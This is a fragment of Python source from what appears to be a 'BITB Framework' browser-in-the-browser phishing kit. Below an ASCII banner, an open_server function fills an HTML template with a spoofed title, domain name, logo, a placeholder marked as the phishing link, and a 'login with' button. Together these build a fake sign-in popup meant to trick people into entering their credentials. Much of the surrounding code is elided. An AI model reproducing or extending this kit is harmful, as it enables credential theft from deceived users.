...
banner="""
   ...
   ___  _____________      _______  ___   __  ____      ______  ___  __ __
  / _ )/  _/_  __/ _ )    / __/ _ \/ _ | /  |/  / | /| / / __ \/ _ \/ //_/
 / _  |/ /  / / / _  |   / _// , _/ __ |/ /|_/ /| |/ |/ / /_/ / , _/ ,<   
/____/___/ /_/ /____/   /_/ /_/|_/_/ |_/_/  /_/ |__/|__/\____/_/|_/_/|_|  
...
def open_server(path,title,webname):
    ...
    with open(r'main.html','r') as file :
        data = file.read()
        data = data.replace("XX-TITLE-XX",title).replace("XX-DOMAIN-NAME-XX",webname).replace("XX-PHISHING-LINK-XX",main_path).replace("XX-LOGO-XX",f"{favicon}").replace("Click me",f"<img src={favicon} style='position:relative;top:2px'></img>&nbsp;&nbsp;<b style='position:relative;bottom:2px'>login with {path}</b>")
